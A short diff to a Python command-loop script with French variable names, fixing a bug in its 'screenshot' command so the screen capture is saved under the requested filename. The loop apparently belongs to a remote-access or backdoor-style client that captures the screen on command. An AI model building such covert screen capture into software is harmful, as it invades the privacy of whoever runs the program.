@@ -64,7 +64,7 @@ while True:
     elif len(commande_split) == 2 and commande_split[0] == "screenshot":
         capture_ecran = ImageGrab.grab()
         capture_filename = commande_split[1] + ".png"
-        capture_ecran.save("capture.png", "PNG")
+        capture_ecran.save(capture_filename, "PNG")
         try:
             f = open(capture_filename, "rb")
         except FileNotFoundError:
